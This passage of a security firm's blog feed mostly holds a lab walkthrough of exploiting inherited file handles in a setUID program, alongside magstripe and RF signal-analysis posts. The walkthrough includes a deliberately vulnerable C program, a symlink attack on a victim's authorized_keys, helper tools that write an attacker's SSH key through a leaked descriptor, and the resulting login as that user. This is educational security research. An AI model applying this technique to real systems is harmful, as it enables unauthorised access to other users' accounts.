+<p>If you want to know more about magstripes (before they become completely obsolete), take a look at:</p>
+<ul>
+<li><a title="Samy Kamkar's magspoof tool" href="https://samy.pl/magspoof/">Samy Kamkar&#8217;s magspoof tool</a> (<a title="video link" href="https://www.youtube.com/watch?v=UHSFf0Lz1qc">video link</a>) &#8211; could be useful if you need your PC to transmit bad data in through a magnetic read head.</li>
+<li><a title="DEF CON 24 - Weston Hecker - Hacking Hotel Keys and Point of Sale Systems" href="https://www.youtube.com/watch?v=mV_0k9Fh590">DEF CON 24 &#8211; Weston Hecker &#8211; Hacking Hotel Keys and Point of Sale Systems</a></li>
+</ul>
+<p>I was pretty inspired by these projects.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/">Reading hotel key cards with a credit card magstripe reader</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/reading-hotel-key-cards-with-a-credit-card-magstripe-reader/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Exploiting inherited file handles in setUID programs</title>
+		<link>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/</link>
+		<comments>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/#comments</comments>
+		<pubDate>Thu, 28 Jun 2018 16:00:40 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6538</guid>
+		<description><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is what we&#8217;ll look at in the context of setUID programs on Linux.<span id="more-6538"></span></p>
+<p>I was reminded of this technique as I tackled an <a href="https://exploit-exercises.com/nebula/level11/">old hacker challenge</a> recently. This a fun challenge. And there&#8217;s a much easier solution than using the technique I&#8217;m going to cover here. Maybe try both the hard way and the easy way.</p>
+<h2>Example program</h2>
+<p>Here&#8217;s a fairly minimal test case of example code &#8211; inspired by the nebula challenge code.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv)
+{
+ char *cmd = argv[1];
+ char tmpfilepath[] = &quot;/tmp/tmpfile&quot;;  // Modern systems need &quot;sysctl fs.protected_symlinks=0&quot; or &quot;chmod 0777 /tmp&quot; for this to be vulnerable to the symlink attack we'll use later.
+ char data[] = &quot;pointless data\n&quot;;
+
+int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
+ unlink(tmpfilepath);
+ write(fd, data, strlen(data));
+ setuid(getuid());
+ system(cmd);
+}
+</pre>
+<p>Let&#8217;s start by compiling this and setting the setUID bit so we have an example to work with:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# useradd -m tom # victim/target user
+root@challenge:/# useradd -m bob # attacker
+root@challenge:/# cd ~bob
+root@challenge:/home/bob# cp /share/fd-leak.c .
+root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
+root@challenge:/home/bob# chown tom:tom fd-leak
+root@challenge:/home/bob# chmod 4755 fd-leak
+root@challenge:/home/bob# ls -l fd-leak
+-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+</pre>
+<p>For exploitation later, we&#8217;ll also need the target user (tom in this case) to have a .ssh directory in their home directory:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
+</pre>
+<p>What this program lacks in realism is hopefully made up for in its simplicity.</p>
+<h2>Normal operation</h2>
+<p>As can be seen from the code above, the program should:</p>
+<ol>
+<li>Create the file /tmp/tmpfile, then delete it. A file descriptor is retained</li>
+<li>Drop privileges. This is poor code for dropping privileges, btw. It suffices for this example, though</li>
+<li>Run a command that is supplied as an argument. It should run as the invoking user, not as the target user (tom)</li>
+</ol>
+<p>Let&#8217;s try it out (note that I modify .bashrc to make it clearer to the reader when a subshell has been spawned):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ./fd-leak bash -p
+subshell...
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+root@challenge:/home/bob# useradd -m tom
+root@challenge:/home/bob# su - tom
+$ mkdir .ssh
+$ ls -la
+total 28
+drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
+drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
+...
+</pre>
+<p>So, yes fd-leak appears to drop privileges. (Our spawned shell isn&#8217;t responsible for the drop in privileges as I&#8217;ve hopefully illustrated by passing -p to bash above and by running id directly).</p>
+<p>Finally, we expect the child process to inherit a file handle to the now deleted file /tmp/tmpfile:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
+lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
+</pre>
+<p>It does. We&#8217;re all set.</p>
+<h2>High level exploit path</h2>
+<p>Our approach to attacking this vulnerable program will follow these high level steps which are covered in more detail in the sections below:</p>
+<ol>
+<li>Create a symlink that the vulnerable code will try to write to. This way we can create a file in a location of our choosing and with a name we choose. We&#8217;ll choose ~tom/.ssh/authorized_keys</li>
+<li>We&#8217;ll run some code in the context of a child process to manipulate the open file handle so we can write the contents of authorized_keys file</li>
+<li>Finally, we log with via SSH</li>
+</ol>
+<h2>Practical exploitation</h2>
+<h3>Step 1: Symlink attack</h3>
+<p>Simple:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+</pre>
+<p>This step was harder in the nebula challenge, but I didn&#8217;t want to cloud the issue.</p>
+<p>If we run the code now, we see that the authorized_keys file is created, but we don&#8217;t control the contents.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+ln: failed to create symbolic link '/tmp/tmpfile': File exists
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+</pre>
+<p>We also don&#8217;t control the permissions the file gets created with. (Feel free to try the above on authorized_keys2 after running &#8220;umask 0&#8243; to check).</p>
+<h3>Step 2: Running code in child process</h3>
+<p>It&#8217;s pretty easy to run code because of the nature of the program. Again, this was harder in the nebula challenge. We can see the file handle we want listed in /proc/self/fd. It&#8217;s file descriptor 3:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak bash
+subshell...
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
+lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
+</pre>
+<p>So we can just &#8220;echo key &gt; /proc/self/fd/3&#8243;? Not really. That&#8217;s just a symlink. A symlink to a file that doesn&#8217;t exist to be precise. And it&#8217;s pointing to a location that we&#8217;d don&#8217;t have privileges to create. Let&#8217;s confirm that:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
+bash: /home/tom/.ssh/authorized_keys: Permission denied
+bob@challenge:~$ echo &gt; /tmp/tmpfile
+bash: /tmp/tmpfile: Permission denied
+bob@challenge:~$ echo &gt; /proc/self/fd/3
+bash: /proc/self/fd/3: Permission denied
+</pre>
+<p>We need to write to file descriptor 3&#8230; So is there are version of cat that works with file descriptors? Not that I know of. Let&#8217;s write some small utilities that will help us get to grips with accessing inherited file handles. We&#8217;ll write 3 tools:</p>
+<ul>
+<li>read &#8211; that uses the read function to read a set number of bytes from a particular file descriptor</li>
+<li>write &#8211; that writes a string of our choosing to a particular file descriptor</li>
+<li>lseek &#8211; that lets us position our read/write</li>
+</ul>
+<p>Here&#8217;s the source and compilation of the (very crude) demo tools:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ cat read.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ char buf[1024];
+ memset(buf, 0, 1024);
+ int r = read(atoi(argv[1]), buf, 10);
+ printf(&quot;Read %d bytes\n&quot;, r);
+ write(1, buf, 10);
+}
+
+bob@challenge:~$ gcc -o read read.c
+bob@challenge:~$ cat write.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;writing %s to fd %s\n&quot;, argv[2], argv[1]);
+ write(atoi(argv[1]), argv[2], strlen(argv[2]));
+}
+bob@challenge:~$ gcc -o write write.c
+bob@challenge:~$ cat lseek.c
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;seek to position %s on fd %s\n&quot;, argv[2], argv[1]);
+ lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
+}
+
+bob@challenge:~$ gcc -o lseek lseek.c
+</pre>
+<p>Let&#8217;s see the tools in action. First we try to read, then write to file descriptor 3, but the read always returns 0 bytes:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./read 3
+Read 0 bytes
+bob@challenge:~$ ./write 3 hello
+writing hello to fd 3
+bob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>The reason is that we need to seek to a location in the file that isn&#8217;t the end of the file. Let&#8217;s seek to position 0, the beginning of the file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./read 3
+Read 10 bytes
+pointless bob@challenge:~$ ./read 3
+Read 10 bytes
+data
+hellobob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>Much better.</p>
+<p>Finally we need exploit the program above. We have two choices:</p>
+<ul>
+<li>Run a shell as before, then use our new tool to write the key to authorized_keys; or</li>
+<li>Make a new tool using the functions shown above to write to authorized_keys.</li>
+</ul>
+<p>Let&#8217;s do the former. The latter is an exercise for the reader. Note that we need to seek to position 0 before we write our data. It&#8217;s important to overwrite the &#8220;pointless&#8221; message already there as that corrupts the authorized_keys file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in bobkey.
+Your public key has been saved in bobkey.pub.
+bob@challenge:~$ cat bobkey.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
+bob@challenge:~$ ls -l bobkey.pub
+-rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
+ writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
+</pre>
+<h3>Step 3: Logging in via SSH</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh -i bobkey tom@localhost
+$ id
+uid=1002(tom) gid=1002(tom) groups=1002(tom)
+</pre>
+<p>We&#8217;re done. We exploited the leaked file descriptor to write data of our choosing to tom&#8217;s authorized_keys file. We used a slightly unrealistic symlink attack along the way, but that doesn&#8217;t invalidate our discussion of how to use and abuse leaked file descriptors.</p>
+<h2>Conclusion</h2>
+<p>Hacker challenges are fun. Even when you accidentally find a much harder solution and waste 10 times longer than necessary.</p>
+<p>Writing secure setUID programs can be difficult. Particularly if you spawn child processes; particularly if you use open() in directories writable by other users. fs.protected_symlinks provides some mitigation for directories with the sticky bit set.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Adventures in RF: Using Inspectrum to analyse FSK and ASK/OOK signals</title>
+		<link>https://labs.portcullis.co.uk/blog/adventures-in-rf-using-inspectrum-to-analyse-fsk-and-askook-signals/</link>
+		<comments>https://labs.portcullis.co.uk/blog/adventures-in-rf-using-inspectrum-to-analyse-fsk-and-askook-signals/#comments</comments>
+		<pubDate>Fri, 06 Apr 2018 12:42:48 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[hardhack]]></category>
+		<category><![CDATA[rf]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6292</guid>
+		<description><![CDATA[<p>In this post we&#8217;ll take a brief look at inspectrum, a graphical tool for analysing signals captured via software defined radio (SDR) receivers &#8211; like the RTL-SDR or HackRF One. We&#8217;ll run through two examples of viewing digital signals. The first uses frequency shift keying (FSK). The second uses amplitude shift keying on-off keying (ASK/OOK). These [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/adventures-in-rf-using-inspectrum-to-analyse-fsk-and-askook-signals/">Adventures in RF: Using Inspectrum to analyse FSK and ASK/OOK signals</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we&#8217;ll take a brief look at <a title="inspectrum" href="https://github.com/miek/inspectrum">inspectrum</a>, a graphical tool for analysing signals captured via software defined radio (SDR) receivers &#8211; like the <a title="RTL-SDR" href="https://www.rtl-sdr.com/about-rtl-sdr/">RTL-SDR</a> or <a title="HackRF One" href="https://greatscottgadgets.com/hackrf/">HackRF One</a>.<span id="more-6292"></span></p>
+<p>We&#8217;ll run through two examples of viewing digital signals. The first uses <a title="frequency shift keying (FSK)" href="https://en.wikipedia.org/wiki/Frequency-shift_keying">frequency shift keying (FSK)</a>. The second uses <a title="amplitude shift keying" href="https://en.wikipedia.org/wiki/Amplitude-shift_keying">amplitude shift keying</a> <a title="on-off keying" href="https://en.wikipedia.org/wiki/On-off_keying">on-off keying</a> (ASK/OOK). These are two very common types of <a title="modulation" href="https://en.wikipedia.org/wiki/Modulation">modulation</a>.</p>
+<p>I&#8217;d previously used <a title="baudline" href="http://www.baudline.com/index.html">baudline</a> for this task, which people might want to check out. But I switched to inspectrum recently. I prefer it because its simplicity and ease of use. Also, inspecrum is actively maintained, whereas baudline doesn&#8217;t seem to be.</p>
+<h2>Installation</h2>
+<p>If you&#8217;re on a recent Debian-based OS, you can probably:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+apt-get install inspectrum
+</pre>
+<p>Alternatively, installing the github version isn&#8217;t a bad option &#8211; especially if you find your lacking a couple of features. The <a title="instructions" href="https://github.com/miek/inspectrum/wiki/Build">instructions</a> are pretty good. If you find that libliquid isn&#8217;t available for your OS, you can <a title="build it" href="https://github.com/jgaeddert/liquid-dsp">build it</a> pretty easily.</p>
+<h2>Example 1: FSK signal</h2>
+<p>The signal for this demo is one captured from a car keyfob at 2 million samples per second. If you want to play along, plug in your RTL-SDR, HackRF One and capture a signal (e.g. using <a title="gqrx" href="http://gqrx.dk/">gqrx</a> or <a title="hackrf_transfer" href="https://github.com/mossmann/hackrf/blob/master/host/hackrf-tools/src/hackrf_transfer.c">hackrf_transfer</a>).</p>
+<p>By default inspectrum assumes 32-bit complex floating point samples, which what gqrx gives us. If you used hackrf_transfer, you&#8217;ll have signed 8-bit integers, so use the file extension .cs8 &#8211; inspectrum can read that format too.</p>
+<p>If you load your sample in inspectrum and set the sample rate, you&#8217;ll see something like this:</p>
+<div id="attachment_6372" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6293"><div class="lb-album"><a href="#image-6293"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_135218-300x194.png" alt="Signal viewed in Inspectrum" class="size-medium wp-image-6372"><span></span></a></div>              
+<a href="#imageclose-6293" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6293">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_135218.png" alt="image-6293">
+                   </div></a><p class="wp-caption-text">Signal viewed in Inspectrum</p></div>
+<p>We see 7 bursts of signal across 3 different frequencies.</p>
+<p>Note that setting the sample rate isn&#8217;t vital. If you don&#8217;t, it just means the scale on the time axis will be wrong &#8211; not something you&#8217;ll always care about.</p>
+<p>Next we&#8217;ll use the zoom slider to take a closer look at part of the signal. Hopefully we can see the 1&#8242;s and 0&#8242;s.</p>
+<div id="attachment_6373" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6294"><div class="lb-album"><a href="#image-6294"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1355141-300x157.png" alt="Zoom slider usage" class="size-medium wp-image-6373"><span></span></a></div>              
+<a href="#imageclose-6294" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6294">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1355141.png" alt="image-6294">
+                   </div></a><p class="wp-caption-text">Zoom slider usage</p></div>
+<p>Hmm. We&#8217;re hoping to see something that looks a bit like a square wave, showing the 1&#8242;s and 0&#8242;s. Which we clearly can&#8217;t see yet. Let&#8217;s tweak a few more controls.</p>
+<p>Increase the &#8216;Power min&#8217; slider until the background noise becomes pure black:</p>
+<div id="attachment_6374" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6295"><div class="lb-album"><a href="#image-6295"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1356051-300x145.png" alt="Decreasing Power Min slider to remove noise" class="size-medium wp-image-6374"><span></span></a></div>              
+<a href="#imageclose-6295" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6295">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1356051.png" alt="image-6295">
+                   </div></a><p class="wp-caption-text">Decreasing Power Min slider to remove noise</p></div>
+<p>Decrease the &#8216;Power max&#8217; slider until the strongest part of the signal is shown in red.</p>
+<div id="attachment_6362" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6296"><div class="lb-album"><a href="#image-6296"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1356351-300x174.png" alt="Increasing Power max slider to turn signal red" class="size-medium wp-image-6362"><span></span></a></div>              
+<a href="#imageclose-6296" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6296">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1356351.png" alt="image-6296">
+                   </div></a><p class="wp-caption-text">Increasing Power max slider to turn signal red</p></div>
+<p>This is useful because we&#8217;ve ignored the noise and shown the signal of interest in red. But it&#8217;s still not the square wave we wanted to see.</p>
+<p>The reason for this is that our FFT is showing us really good resolution in the frequncy domain (vertical axis), but really poor (fuzzy) resolution in the time domain (horizontal axis). When working with FFT plots is important to remember that you always sacrifice fidelity in one domain to improve the other. We&#8217;ll move the FFT slider to the left. This will squish our plot along the frequency axis, but stretch it along the time axis.</p>
+<div id="attachment_6363" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6297"><div class="lb-album"><a href="#image-6297"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1357521-300x148.png" alt="Using FFT slider to improve resolution in time domain" class="size-medium wp-image-6363"><span></span></a></div>              
+<a href="#imageclose-6297" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6297">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1357521.png" alt="image-6297">
+                   </div></a><p class="wp-caption-text">Using FFT slider to improve resolution in time domain</p></div>
+<p>That&#8217;s better. We can see the square wave we&#8217;d expect for an FSK signal now. It&#8217;s still a bit fuzzy, but this looks good enough to read 1&#8242;s and 0&#8242;s off. We can tweak the power settings to make things clearer:</p>
+<div id="attachment_6364" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6298"><div class="lb-album"><a href="#image-6298"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1359001-300x156.png" alt="Tweak power settings to improve clarity" class="size-medium wp-image-6364"><span></span></a></div>              
+<a href="#imageclose-6298" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6298">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1359001.png" alt="image-6298">
+                   </div></a><p class="wp-caption-text">Tweak power settings to improve clarity</p></div>
+<p>If we tick Enable cursors we can measure the duration of pulses.</p>
+<div id="attachment_6365" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6299"><div class="lb-album"><a href="#image-6299"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1401121-300x177.png" alt="Using cursors" class="size-medium wp-image-6365"><span></span></a></div>              
+<a href="#imageclose-6299" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6299">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1401121.png" alt="image-6299">
+                   </div></a><p class="wp-caption-text">Using cursors</p></div>
+<p>If we scroll around a bit, some of signal looks weak.</p>
+<div id="attachment_6366" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6300"><div class="lb-album"><a href="#image-6300"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1401241-300x168.png" alt="Identifying weak parts of signal" class="size-medium wp-image-6366"><span></span></a></div>              
+<a href="#imageclose-6300" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6300">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1401241.png" alt="image-6300">
+                   </div></a><p class="wp-caption-text">Identifying weak parts of signal</p></div>
+<p>Maybe we could still infer the square wave form, but lets see what we can do by tweaking the Power sliders again:</p>
+<div id="attachment_6367" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6301"><div class="lb-album"><a href="#image-6301"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1402011-300x140.png" alt="Tweaking power sliders" class="size-medium wp-image-6367"><span></span></a></div>              
+<a href="#imageclose-6301" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6301">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1402011.png" alt="image-6301">
+                   </div></a><p class="wp-caption-text">Tweaking power sliders</p></div>
+<p>Better, but still not a good representation. How about decreasing the FFT slider again?  This will give us better accuracy in the time domain. But will squish the 1 and 0 lines closer together.</p>
+<div id="attachment_6368" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6302"><div class="lb-album"><a href="#image-6302"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1403371-300x109.png" alt="Decreasing FFT slider" class="size-medium wp-image-6368"><span></span></a></div>              
+<a href="#imageclose-6302" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6302">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1403371.png" alt="image-6302">
+                   </div></a><p class="wp-caption-text">Decreasing FFT slider</p></div>
+<p>That&#8217;s pretty good. We can still tell the difference between a 1 and 0 and we&#8217;ve got a really good representation of where each 1 and 0 starts in the time domain.</p>
+<p>Let&#8217;s briefly revisit our use of cursors:</p>
+<div id="attachment_6369" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6303"><div class="lb-album"><a href="#image-6303"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1404351-300x146.png" alt="Measuring a single pulse" class="size-medium wp-image-6369"><span></span></a></div>              
+<a href="#imageclose-6303" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6303">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/01/Screenshot_20180121_1404351.png" alt="image-6303">
+                   </div></a><p class="wp-caption-text">Measuring a single pulse</p></div>
+<p>It&#8217;s hard to be accurate with just a single pulse (15.15Khz?), but we can easily span more than 1 pulse.</p>
